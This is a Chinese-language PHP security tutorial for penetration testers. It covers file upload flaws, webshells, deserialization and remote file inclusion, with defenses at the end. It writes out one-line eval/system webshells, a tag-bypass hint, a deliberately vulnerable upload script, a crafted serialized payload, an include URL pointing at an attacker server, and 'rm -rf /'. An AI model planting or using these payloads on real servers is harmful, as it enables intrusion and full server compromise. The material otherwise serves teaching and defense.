# 一、什么是PHP?

## 1. 定义

PHP(全称:PHP: Hypertext Preprocessor,超文本预处理器)是一门开源的服务器端脚本编程语言, 专门用于开发Web网站的后端逻辑。

## 2. 核心关键词

+ 服务器端：PHP代码只在远程服务器上运行,永远不会在用户的电脑浏览器中运行;用户的电脑只能看到PHP运行后返回的结果(网页、图片、文字等),看不到PHP源码。
+ 脚本语言：无需编译,服务器上的PHP引擎可以直接解析执行,开发/运行效率高,这也是绝大多数 网站选择PHP做后端的核心原因。
+ Web专属：PHP天生为网站开发而生,专门处理网站的后台业务逻辑,是目前全球使用量最高的 Web后端语言。

## 3. PHP在网站中的角色

网站的组成分为「前端」和「后端」,两者分工明确,缺一不可:

+ 前端(HTML/CSS/JS):只负责「展示」,比如页面布局、按钮样式、图片显示,运行在用户电脑,决定网站「长什么样」。
+ 后端(PHP):网站的核心大脑,只负责「处理业务逻辑」,运行在服务器,决定网站「能做什么」。

PHP负责处理网站所有的核心操作:

1. 验证用户的账号密码是否正确,判断能否登录;
2. 接收用户上传的文件、表单信息,并处理/保存;
3. 操作数据库,实现数据的增删改查(比如存储用户信息、文章内容);
4. 处理用户的所有请求,返回对应的结果给前端。

## 4. PHP执行条件

1. 可访问
2. 可解析
3. 已知文件位置

# 二、为什么学PHP?

## 1. PHP的市场占比极高,是漏洞重灾区

在国内,80%以上的中小型网站、论坛、政务系统、企业平台的后端都是基于PHP开发(比如Discuz论坛、织梦CMS、帝国CMS、各类商城网站)。我们做渗透测试、挖漏洞,绝大多数的目标网站都是PHP开发的,不懂PHP,就看不懂网站的运行逻辑,更看不懂漏洞的成因。

## 2. 不懂PHP,看不懂漏洞的底层原理

所有的Web漏洞(文件上传、SQL注入、XSS、代码执行、文件包含),针对PHP网站的占比超过 70%。

+ 比如:文件上传漏洞就是PHP代码写的不严谨导致的;
+ 比如:SQL注入就是PHP接收参数时没有过滤导致的;
+ 比如:WebShell能生效,本质就是PHP的函数执行逻辑被利用。

只学工具、不学PHP原理,永远是「知其然不知其所以然」,永远成不了合格的网安工程师,只能做「脚本小子」。

## 3. 不懂PHP,看不懂漏洞的利用方式

我们挖漏洞的核心是「找到代码的缺陷」,渗透测试的核心是「利用代码的缺陷」。
如果连PHP的基础语法、参数接收、函数作用都看不懂,就算找到了漏洞,也不知道怎么利用; 就算拿到了WebShell,也不知道怎么操作。

## 4. PHP是网安入门最友好的后端语言

PHP语法简单、易懂、贴近自然语言,相比于Java、Python、Go,PHP的入门成本最低,我们只需要学「网安相关的PHP基础」,不需要学完整的开发体系,就能满足渗透测试的需求,性价比极高。

# 三、PHP核心基础语法

## 1. PHP的标签风格

一句话木马：`<?php eval($_POST['x']);?>` 有时候会遇到过滤标签 `<?php`，直接上传会被拦截，可使用其他 PHP 标签绕过过滤。

**(1) 标准标签**

```php
<?php
echo "111";
?>
```

适用：所有PHP环境,开发、代码审计标准写法,**必须掌握**。

**(2) 短标签**

```php
<?
echo "短标签";
?>
```

限制：需在php.ini开启`short_open_tag`,很多服务器默认禁用,不推荐生产使用。

**(3) ASP风格标签**

```php
<%
echo "ASP标签";
%>
```

限制：需配置开启,现在基本淘汰,渗透很少遇见。

**(4) Script脚本标签**

```php
<script language="php">
echo "script标签";
</script>
```

老旧写法,现代环境基本废弃。

## 2. PHP变量

**(1) 变量的定义**

PHP中,变量是用来存储数据的容器,比如存储文件的保存路径、存储用户上传的文件名、存储接收的参数等。

**(2) 变量的核心规则**

+ 变量必须以 `$` 开头,比如：`$name`、`$upload_dir`、`$file_name`；
+ 变量名区分大小写,比如 `$name` 和 `$Name` 是两个不同的变量；
+ 变量可以直接赋值,不需要提前声明类型,PHP会自动识别。

```php
$upload_dir = './uploads/';  // 存储文件保存目录，字符串类型
$age = 20;                   // 存储数字，数值类型
```

**(3) 常用变量场景**

在漏洞代码中,最常见的PHP变量就是文件上传相关的：`$upload_dir`（文件保存目录）、`$file_name`（文件名）、`$file_path`（文件完整路径）。

## 3. 常见输出函数

**(1) echo**

用于输出数字、字符串、布尔值等单一基础数据类型,无返回值,使用频率最高。

```php
echo 123;
echo "hello";
echo true;
```

补充：PHP单、双引号字符串解析

单引号 `''`：不会解析字符串内的`$`变量,不会转换`\n`、`\t`等转义符,仅能转义`\'`和`\\`。

```php
$str = "hello";
echo '内容：$str';
// 输出：内容：$str
```

双引号 `""`：自动解析`$`变量并替换为变量值,支持`\n`、`\t`、`\"`等全部转义字符。

```php
$str = "hello";
echo "内容：$str";
// 输出：内容：hello
```

**(2) print_r()**

专门打印数组、对象等复合类型数据,可清晰展示内部结构,调试代码常用。

```php
print_r($_FILES);
```

## 4. PHP字符串拼接

**(1) 拼接规则**

PHP中,拼接两个字符串（比如把「保存目录」和「文件名」拼在一起得到完整路径）,使用**英文点号** `.` 完成。

```php
$upload_dir = './uploads/';  // 定义文件保存目录
$file_name = 'test.php';     // 定义文件名
$file_path = $upload_dir . $file_name;  // 拼接得到完整路径：./uploads/test.php
```

**(2) 意义**

文件上传漏洞中,攻击者就是利用这个语法,通过篡改文件名,让恶意文件被拼接成合法路径保存到服务器,这是漏洞利用的核心环节。

## 5. PHP超全局变量

**(1) 什么是超全局变量?**

+ 「全局」：在PHP代码的任何位置都可以**直接使用**,不需要提前定义；
+ 「超」：PHP官方内置的变量,专门用来接收用户传递的各种数据,天生存在,直接调用即可。

**(2) 核心特点**

+ 所有超全局变量都是大写的**数组形式**；
+ 专门用来接收「用户从浏览器传递给服务器的数据」；
+ 是后端接收前端参数的核心方式,也是所有Web漏洞的「数据入口」。

**(3) `$_FILES` 超全局变量——文件上传专属**

`$_FILES` 是PHP专门用来接收用户上传文件的所有信息的超全局变量,没有它就实现不了文件上传功能。

+ 核心语法：`$_FILES['表单名称']['属性名']`
+ 核心属性：
  a. `$_FILES['file']['name']`：获取用户上传文件的「原始文件名」,比如 `头像.jpg`、`test.php`；
    i. 重点：这个值是攻击者可以随意篡改的!攻击者可以把恶意PHP文件改成 `头像.jpg.php`,伪装成图片,这是文件上传漏洞的核心利用点。
  b. `$_FILES['file']['tmp_name']`：获取用户上传文件在服务器的「临时文件名+临时路径」；
    i. 重点：这个值是PHP自动生成的,攻击者完全无法篡改、无法伪造,是PHP的安全机制,用来防止攻击者伪造文件上传。

**(4) `$_GET` 超全局变量——接收GET请求传递的参数**

`$_GET` 专门用来接收用户通过**「GET请求」**传递的所有数据,数据来自于浏览器地址栏的URL中。

+ 语法：`$_GET['参数名']`
+ 案例：访问网址 `http://www.xxx.com/index.php?user=admin&pwd=123`,后端接收参数：

```php
$user = $_GET['user'];  // 接收的值是 admin
$pwd = $_GET['pwd'];    // 接收的值是 123
```

+ 特点：参数在URL中可见,适合传递非敏感的查询数据。

**(5) `$_POST` 超全局变量——接收POST请求传递的参数**

`$_POST` 专门用来接收用户通过**「POST请求」**传递的所有数据,数据藏在请求体中,URL中不可见。

+ 语法：`$_POST['参数名']`
+ 案例：用户登录时输入账号密码,点击登录,后端接收参数：

```php
$user = $_POST['username'];  // 接收账号
$pwd = $_POST['password'];  // 接收密码
```

+ 特点：适合传递敏感数据、大文件、表单信息,文件上传、登录、注册等所有核心操作,都用POST传参；
+ 重点：WebShell的核心代码中,100%会用到 `$_POST`,比如 `$_POST[123]`,用来接收攻击者的恶意指令。

## 6. PHP后端如何接收前端传递的参数?

这是所有Web交互的核心,也是所有漏洞的起点：**前端所有的数据,最终都会通过「超全局变量」被后端PHP接收并处理,没有第二种方式!**

1. **接收GET请求的参数 → 用 `$_GET`**
    - 场景：查询数据、搜索内容、分页等；
    - 语法：`$变量名 = $_GET['参数名'];`
2. **接收POST请求的参数 → 用 `$_POST`**
    - 场景：登录、注册、提交表单、文件上传的表单信息等；
    - 语法：`$变量名 = $_POST['参数名'];`
3. **接收上传的文件信息 → 用 `$_FILES`**
    - 场景：所有文件上传操作；
    - 语法：`$文件名 = $_FILES['file']['name'];`

总结：所有的Web漏洞,本质都是「后端接收了前端的恶意参数,并且没有做过滤,直接使用/执行」。

比如：SQL注入是接收了恶意的查询参数,文件上传是接收了恶意的文件名,代码执行是接收了恶意的指令参数。

# 四、PHP面向对象核心——类与对象

## 1. 核心概念

**(1) 类**

类是具有相同属性和行为的对象的抽象集合,是一种自定义的复合数据类型,定义了某一类事物共有的特征和能执行的操作。

语法规范：PHP中定义类必须使用关键字 class,类名首字母建议大写

```php
class 类名 {
    // 这里写属性
    // 这里写方法
}
```

示例:

```php
class Show {
    public $cmd;
    public function __wakeup() {
        system($this->cmd);
    }
}
```

**(2) 属性**

属性是类的成员变量,用于描述类的特征,是类的核心组成部分。

语法规范:
+ PHP类的属性必须声明访问修饰符,常用的有 public / protected / private（只能在类里面才可以输出）；
+ 类内部的方法中,调用本类的属性时,必须使用 `$this->属性名`,绝对不能直接写属性名,这是PHP语法强制要求；
+ 语法示例：`$this->cmd` 表示当前类的cmd属性。

**(3) 方法**

方法是类的成员函数,用于描述类的行为和能执行的操作,是类的功能实现部分。类比汽车的启动、刹车,对应到PHP类中,就是能执行特定逻辑的函数。

语法规范:
+ 类中的方法也需要声明访问修饰符,格式为 `public function 方法名`；
+ 类中的方法分为普通方法和魔术方法两类,二者有本质区别,是漏洞利用的核心考点。

**(4) 对象**

对象是类的实例化产物,是类的具体表现形式,一个类可以实例化出无数个对象,每个对象都拥有类中定义的全部属性和方法。

语法规范：PHP中通过关键字 `new` 实现类的实例化

```php
$对象名 = new 类名();
```

示例：`$obj = new Show();` 实例化 Show 类,生成对象并赋值给变量`$obj`。

**(5) 实例化**

+ 定义：从抽象的类创建出具体的对象的过程,称为实例化。
+ 核心关键字：`new` 是PHP中唯一实现实例化的关键字,无其他替代方式。
+ 核心特性：实例化完成后,对象就拥有类的全部属性和方法,可通过对象名->属性名给属性赋值/取值,对象名->方法名 调用方法。

```php
$gaga = new person();
$gaga->age;
$gaga->say();
```

## 2. 类与对象的核心使用语法

1. 给对象的属性赋值：`$obj->cmd = 'calc';`
2. 调用对象的普通方法：`$obj->方法名();`
3. 类内部调用自身属性：`$this->属性名;`
4. 类内部调用自身方法：`$this->方法名();`

## 3. 普通方法 vs 魔术方法

**(1) 普通方法**

+ 定义：不以双下划线开头的类方法,是开发者自定义的业务方法。
+ 执行规则：必须手动调用才能执行,不调用则永远不会运行。
+ 示例：`public function login();` 必须写 `$obj->login();` 才会执行该方法。
+ 安全属性：普通方法几乎无安全风险,因为执行权完全由开发者掌控。

**(2) 魔术方法**

+ 定义：PHP官方预定义的、所有以两个下划线开头的特殊方法,属于PHP语言的内置机制,不是开发者自定义的。
+ 核心特征:
    - 无需手动调用,满足特定的触发条件后,会自动触发、自动执行；
    - 魔术方法的函数名是固定的,PHP有严格的命名规范,不能随意修改；
    - 魔术方法是PHP的底层机制,所有PHP类都可以直接使用这些方法。
+ 安全属性：极高安全风险,是PHP反序列化漏洞的唯一触发点,也是网安人员代码审计的核心目标。
+ 常用魔术方法：
    - `new`关键字实例化 → `__construct`
    - 销毁 → `__destruct`
    - 读不存在属性 → `__get`
    - 写不存在属性 → `__set`
    - 打印对象 → `__toString`
    - 调用不存在方法 → `__call`
    - 克隆 → `__clone`
    - 序列化 / 反序列化 → `__sleep` / `__wakeup`

# 五、序列化与反序列化

## 1. 核心定义

**(1) 序列化**

通过PHP内置函数 `serialize`,将一个完整的PHP对象,转换为一串结构化的、可传输的纯字符串的过程。

语法：`serialize($obj);` 传入一个对象,返回对应的序列化字符串。

```php
var_dump(serialize($gaga));
```

**(2) 反序列化**

通过PHP内置函数 `unserialize`,将序列化生成的字符串,还原为序列化之前的完整PHP对象的过程,是序列化的反向操作。

核心作用：服务器接收前端传递的序列化字符串后,还原为对象,读取其中的用户信息、业务数据等。

语法：`unserialize($str);` 传入一个序列化字符串,返回对应的PHP对象。

```php
var_dump(unserialize(serialize($gaga)));
```

## 2. 序列化字符串的格式解析

序列化后的字符串看似是乱码,实则有严格的结构化格式,每一段都有固定含义,看懂格式才能手动修改恶意载荷,是高阶漏洞利用的基础。

**(1) 基础格式规则**

序列化字符串由类型标识+长度+内容组成,核心标识含义:

+ `O` :表示这是一个对象的序列化结果
+ `:` :分隔符,用于分隔标识、长度、内容
+ 数字:表示后续内容的长度
+ `"字符串"`:表示类名、属性名、属性值
+ `{}` :包裹对象的所有属性键值对

**示例拆解：**
`O:4:"Show":1:{s:3:"cmd";s:4:"calc";}`

1. `O:4:"Show"` 这是一个对象,类名的长度是4,类名是Show；
2. `:1` 该对象包含1个属性（大括号内一组键;值算 1 个属性）；
3. `{}` 包裹该对象的所有属性；
4. `s:3:"cmd"` 该属性的键名是字符串类型,长度3,键名是cmd；
5. `s:4:"calc"` 该属性的键值是字符串类型,长度4,键值是calc。

**(2) 格式修改规则**

比如要把命令从calc改为mspaint,只需修改两处:
`O:4:"Show":1:{s:3:"cmd";s:7:"mspaint";}`
键值从calc改为mspaint,对应把`s:4`改为`s:7`即可,其余内容不变。

## 3. 序列化的安全本质

序列化本身是绝对安全的,它只是一个数据格式转换工具;反序列化本身也是绝对安全的,它只是一个反向转换工具;所有的安全风险,都不是来自序列化和反序列化本身,而是来自反序列化后的自动触发逻辑+危险函数的调用。

# 六、高危危险函数

## 1. 危险函数的定义

PHP中的高危危险函数,是指能够直接执行服务器系统命令、执行任意PHP代码、包含远程文件、读写服务器文件的内置函数,这类函数的特点是权限极高、破坏力极强。对网安人员来说:在代码中看到这些函数,就意味着找到了漏洞的突破口;对开发者来说:代码中尽量不要使用这类函数,必须使用时要做严格的参数校验。

## 2. 核心高危危险函数

**(1) 系统命令执行函数**

这类函数的作用是直接执行服务器的操作系统命令,Windows和Linux系统均适用,一旦被利用,攻击者可完全控制服务器。

+ `system()`：执行系统命令,命令执行的完整输出会直接打印到页面,函数返回命令执行状态码。

```php
system('calc');       // Windows打开计算器
system('whoami');     // 查询服务器当前用户
system('rm -rf /');   // Linux高危命令，删除根目录所有文件
```

+ `exec()`：同样可执行系统命令,不会直接输出内容,仅返回命令最后一行输出,隐蔽性高于system。

**(2) PHP代码执行函数**

这类函数的作用是将传入的字符串当作PHP代码直接执行,破坏力比系统命令执行函数更强,因为可以直接写入一句话木马,实现长期控制服务器。

+ `eval()`：经典代码执行函数,将传入字符串当作完整PHP代码执行,传入内容必须是规范完整PHP语句。

```php
eval('phpinfo();');      // 输出PHP环境配置信息
eval($_POST['x']);       // 一句话木马核心，接收POST参数并执行任意PHP代码
```

若需要通过 eval 查看服务器目录,POST 传入参数 `x=system('ls');`,等价执行 `eval("system('ls');");`,调用 system 列出当前目录文件。

+ `assert()`：功能同eval,可执行PHP代码,支持不完整语句,适配性更广,利用门槛更低,风险更高。

**(3) 文件包含函数**

这类函数的作用是将指定的文件内容读取到当前脚本中,并当作PHP代码执行,是除反序列化漏洞外,Web安全中最常见的高危漏洞之一。

漏洞原理：如果参数可控,攻击者可传入远程恶意文件的URL,服务器会包含并执行该文件中的恶意代码,实现远程控制。

+ `include`：包含指定文件,文件不存在时仅报警告,脚本继续执行；
+ `require`：包含指定文件,文件不存在时报致命错误,脚本停止执行；

# 七、文件上传漏洞

文件上传是网站最常见的功能(头像上传、附件上传、图片上传),从「用户点击上传按钮」到「文件成功保存在服务器」。

## 1. 文件上传流程

我们用「寄快递」的形象比喻：

**(1) 步骤1:用户选文件 → 填快递单**

用户在浏览器中,通过上传表单选择要上传的文件(图片/附件/脚本),点击「上传」按钮;此时浏览器会把文件的基本信息(文件名、大小、类型)整理好,准备发送给服务器。

**(2) 步骤2:浏览器打包 → 用POST请求发货**

浏览器将用户选择的文件,以「二进制数据包」的形式打包,通过 POST请求 发送给服务器；

+ 为什么必须用POST? 因为GET请求能传递的数据量极小,无法承载文件的大小,POST请求无数据量限制,是文件上传的唯一方式。

**(3) 步骤3:服务器接收 → 存入临时仓库**

服务器收到浏览器发送的文件数据包后,不会直接保存到指定目录,而是会先把文件存入服务器的「临时目录」,并由PHP自动生成一个「临时文件名」,这个文件名就是 `$_FILES['file']['tmp_name']`；

+ 核心特点:临时文件是一次性的,PHP脚本执行结束后,临时文件会被服务器自动删除,不会残留。

**(4) 步骤4:PHP代码做最终决策 → 完成上传(核心)**

这是整个文件上传流程的核心步骤,也是文件上传漏洞产生的唯一环节!
服务器不会自己做任何决策,所有的操作都由PHP代码决定,PHP会完成3个核心操作:

1. 决定「要不要接收这个文件」(是否过滤文件类型、文件名)；
2. 决定「把文件存到哪里」(指定保存目录,比如 ./uploads/)；
3. 决定「给文件起什么名字」(使用原始文件名还是重新命名)；

最后,PHP会调用核心函数 `move_uploaded_file()`,将临时目录中的文件「搬运」到指定的保存目录,文件搬运成功后,才算真正的上传成功!

## 2. 文件上传核心函数

**(1) move_uploaded_file()**

语法：

```php
move_uploaded_file(临时文件路径, 目标保存路径);
// 比如:
move_uploaded_file($_FILES['file']['tmp_name'], $file_path);
```

核心特点：

+ 安全特性:这是PHP的安全函数,只能搬运通过POST请求上传的临时文件,无法搬运服务器上的其他文件,能有效防止攻击者伪造文件上传；
+ 无过滤特性:这个函数只是「搬运工」,只负责搬文件,不会检查文件的类型、内容、是否为恶意文件；
+ 核心结论:这个函数本身没有漏洞,文件上传漏洞的产生,永远不是这个函数的问题,而是PHP代码没有在搬运前做过滤校验。

## 3. 文件上传漏洞

**(1) 什么是文件上传漏洞?**

文件上传漏洞,是指网站的PHP上传代码,没有对用户上传的文件进行严格的过滤和校验,导致攻击者 可以将「恶意的PHP脚本文件」伪装成合法文件(比如图片、文档),成功上传到服务器,并且能被服务器解析执行的高危漏洞。

**(2) 漏洞产生的核心原因**

后端的PHP上传代码,没有对用户上传的文件进行有效的过滤校验,直接使用了攻击者可控的原始文件名,直接将文件保存到服务器。

典型的无过滤上传:

```php
<?php
$upload_dir = './uploads/';
$file_name = $_FILES['file']['name']; // 直接使用攻击者可控的文件名
$file_path = $upload_dir . $file_name; // 直接拼接路径
// 直接搬运,无任何过滤
if (move_uploaded_file($_FILES['file']['tmp_name'], $file_path)) {
    echo "上传成功!";
}
?>
```

漏洞点分析:代码中没有检查文件是不是图片、没有检查文件名是不是恶意后缀、没有过滤特殊字符,攻击者传什么文件,服务器就保存什么文件,这就是最基础、最典型的文件上传漏洞。

**(3) 漏洞的危害**

文件上传漏洞是Web安全中危害最高的漏洞之一,一旦存在这个漏洞,攻击者可以:

1. 上传恶意的PHP脚本文件到服务器；
2. 通过浏览器访问这个文件的地址,让服务器解析执行脚本；
3. 拿到服务器的权限,进而控制整个网站、数据库,甚至服务器本身；
4. 泄露网站的用户数据、管理员账号密码,甚至篡改网站内容。

**(4) 漏洞的核心利用条件**

攻击者上传了恶意文件后,想要让文件生效,必须满足2个条件(缺一不可):

+ 条件1:文件成功上传到服务器,并且知道文件的「完整访问地址」(可访问)；
+ 条件2:文件存放的目录,被服务器配置了「PHP解析权限」(可解析)；

**核心**:上传成功 + 可访问 + 可解析 = 漏洞利用成功!

# 八、WebShell

## 1. 定义

WebShell 就是攻击者通过漏洞,上传到目标服务器的、能被服务器解析执行的、可以远程控制服务器的 PHP脚本文件,也被称为「网站后门」、「网页后门」。

## 2. 核心特点

+ 本质就是一个普通的PHP文件,后缀是 .php,和正常的PHP文件没有任何区别；
+ 不是病毒、不是工具,只是一段包含「恶意执行逻辑」的PHP代码；
+ 核心能力是「接收攻击者的远程指令,并让服务器执行」,实现对服务器的远程控制。

## 3. 分类

**(1) 一句话木马**

体积极小,单行代码,功能精简,依靠工具连接执行操作,比如 `<?php eval($_POST['x']);?>`,属于微型 webshell 文件。

**(2) 大马（大型木马文件）**

完整PHP脚本,代码量大,自带可视化面板,无需额外工具,上传后直接浏览器访问就能管理文件、数据库、执行命令等。

总结：一句话木马、大型大马都属于 WebShell,本质均为上传至服务器、可被 Web 解析执行的恶意脚本文件。所有 WebShell 都必须以文件形式存放于网站可访问目录,才能够正常解析生效。

## 4. WebShell生效的必备条件

和文件上传漏洞的利用条件完全一致,也是所有后门生效的核心条件:

1. 成功上传:WebShell文件被成功保存到目标服务器的指定目录；
2. 可访问:攻击者能通过浏览器,访问到这个WebShell文件的完整地址；
3. 可解析:文件所在目录支持PHP解析,服务器能把它当成PHP脚本执行。

## 5. 两种PHP WebShell

这两种WebShell是PHP后门的基础,代码极简、危害极大,所有复杂的WebShell都是基于这两种形态拓展的。

**(1) 代码执行型WebShell**

```php
<?php eval($_POST['x']); ?>
```

+ 核心函数:`eval()`
+ 函数作用:将「接收到的字符串」当成「合法的PHP代码」,直接交给服务器解析执行；
+ 运行逻辑:攻击者通过POST请求,向这个文件传递任意的PHP代码(比如删库、查数据),`eval()` 会把这些代码执行,实现对网站的控制；
+ 危害范围:控制网站的PHP程序,操作网站的数据库、文件、内容。

**(2) 系统命令型WebShell**

```php
<?php system($_POST['x']); ?>
```

+ 核心函数:`system()`
+ 函数作用:将「接收到的字符串」当成「服务器的操作系统命令」,直接交给服务器执行；
+ 运行逻辑:攻击者通过POST请求,传递任意的系统命令(比如查看服务器文件、新建账号、删除文件),`system()` 会把这些命令执行；
+ 危害范围:控制整个服务器的操作系统,权限极高,危害远大于第一种。

## 6. WebShell的核心原理

无论是哪种WebShell,核心原理都是：PHP代码将「未做任何过滤的、攻击者完全可控的用户输入(`$_POST` 接收的参数)」,当成了「合法的执行指令」,直接执行。简单说:服务器盲目信任了攻击者的输入,把攻击者的恶意指令当成了正常的代码/命令去执行,最终导致服务器被控制。

## 7. WebShell和文件上传漏洞的关系

+ WebShell是「攻击的武器」；
+ 文件上传漏洞是「把武器送进服务器的通道」；
+ 攻击者通过「文件上传漏洞」将「WebShell文件」上传到服务器,再通过访问WebShell实现对服务器的控制,这是渗透测试中最经典、最常用的攻击链路!

# 九、PHP反序列化漏洞

## 1. 定义

PHP反序列化漏洞,全称 PHP对象注入漏洞,是指攻击者通过控制服务器端的反序列化输入,将恶意构造的序列化字符串传入服务器的unserialize函数中,触发类中的魔术方法执行,最终导致恶意代码/系统命令被执行的高危漏洞,该漏洞属于远程代码执行漏洞,危害等级为高危-致命。

## 2. 漏洞触发的核心要素

反序列化漏洞的触发有严格的条件,三个要素必须同时满足：

**(1) 反序列化的参数完全可控且无校验**

服务器端的unserialize函数的入参,是由前端用户传递的,且开发者没有对传入的序列化字符串做任何校验:

+ 不校验序列化字符串的来源；
+ 不校验序列化字符串对应的类名是否合法；
+ 不校验序列化字符串的内容是否被篡改。

核心问题:服务器无条件信任所有用户输入的序列化字符串,无论是否是恶意构造的,都会直接执行反序列化操作。

**(2) 目标类中存在可自动触发的魔术方法**

目标服务器的代码中,被反序列化的类中,定义了`__wakeup`、`__destruct`等魔术方法。

核心问题:反序列化操作会自动触发这些魔术方法,无需手动调用,开发者无法感知这个执行过程。

**(3) 魔术方法中调用了高危危险函数**

魔术方法的函数体内部,调用了`system`、`eval`、`exec`等可以执行系统命令或PHP代码的高危函数,且危险函数的参数是类的可控属性。

核心问题:攻击者可以通过控制属性值,向危险函数传入恶意命令,最终被服务器执行。

## 3. 漏洞利用流程

**(1) 正常业务逻辑**

开发使用`unserialize()`解析序列化字符串,还原User对象读取用户数据；原始User类仅普通业务方法,无魔术方法、无危险执行函数,本身不存在安全风险。

**(2) 漏洞根源**

代码直接将用户可控参数传入`unserialize()`,未做白名单、过滤、校验,服务端可接收任意类的序列化字符串并完成反序列化。

**(3) 构造payload步骤**

1. 审计源码寻找危险类：类包含魔术方法,且方法内部调用`system`/`eval`等高危执行函数；
2. 本地复现目标类,修改类内可控属性,填入恶意系统命令；
3. 实例化恶意对象,通过`serialize()`生成恶意序列化字符串（payload）。

**(4) 总结**

可控无校验反序列化输入 + 可触发魔术方法 + 魔术方法内含危险执行函数 = PHP反序列化漏洞

# 十、远程文件包含漏洞

## 1. 漏洞定义

远程文件包含漏洞属于高危代码执行漏洞。当页面中`include`/`require`等文件包含函数的传入参数由用户可控,且后端未做过滤、路径校验,同时 PHP 配置`allow_url_include=On`时,攻击者可传入外网恶意文件 URL；服务器会远程读取该文件内容,当作 PHP 代码解析执行,最终造成远程代码执行,攻击者可控制服务器。

## 2. 漏洞利用流程

**(1) 示例**

```php
<?php
    $file = $_GET['file'];
    include($file);
?>
```

漏洞根源：`$file`参数由前端GET请求传递,完全可控,且无任何校验；include函数支持远程文件包含,只要传入合法的URL即可。

**(2) 利用步骤**

1. 攻击者在自身外网服务器放置恶意文件 `shell.txt`,文件内写入PHP一句话木马；
2. 访问存在文件包含漏洞的页面,传入远程URL参数：
   `http://目标网站/index.php?file=http://攻击者服务器/shell.txt`
3. 目标服务器执行 `include()`,远程拉取并解析攻击者服务器上的txt文件内容；
4. 木马代码被当作PHP脚本执行,攻击者传参即可执行系统命令,远程控制服务器。

前提：PHP配置 `allow_url_include = On`,才支持远程URL文件包含,否则该利用方式失效。

## 3. 漏洞危害及防御

**(1) 危害**

与反序列化漏洞一致,均为远程代码执行漏洞,攻击者可通过该漏洞直接拿下服务器的最高权限,危害等级为致命。

**(2) 防御——禁用高危函数（命令/代码执行）**

适用：文件包含、一句话木马、命令执行、反序列化配合危险函数等漏洞。

原理：修改`php.ini`的`disable_functions`,禁用执行代码、系统命令、文件包含类高危函数,脚本调用直接失效。

操作步骤：
1. 找到服务器`php.ini`配置文件；
2. 修改`disable_functions`,多函数用英文逗号隔开；

```properties
disable_functions = eval,assert,system,exec,passthru,shell_exec,include,require
```

3. 保存配置,重启PHP服务生效。

防护效果：即使代码存在危险函数调用,也无法执行恶意代码、系统命令,从底层阻断利用。

**(3) 防御——类白名单校验**

原理：调用`unserialize()`前校验序列化内容,仅允许业务合法类,拦截攻击者构造的恶意类序列化载荷。

防护效果：恶意对象无法完成反序列化,魔术方法不会触发,彻底封堵反序列化漏洞。

**(4) 防御——严格校验过滤所有用户输入**

Web安全核心原则：不信任任何外部传入参数

1. 数据类型校验：限定参数只能为规定类型；
2. 长度限制：约束参数长度,拦截超长攻击载荷；
3. 关键字过滤：拦截`eval`、`system`、`http://`、`<?php`等恶意关键词；

适用场景：文件包含、上传、反序列化、命令执行等绝大多数Web漏洞。
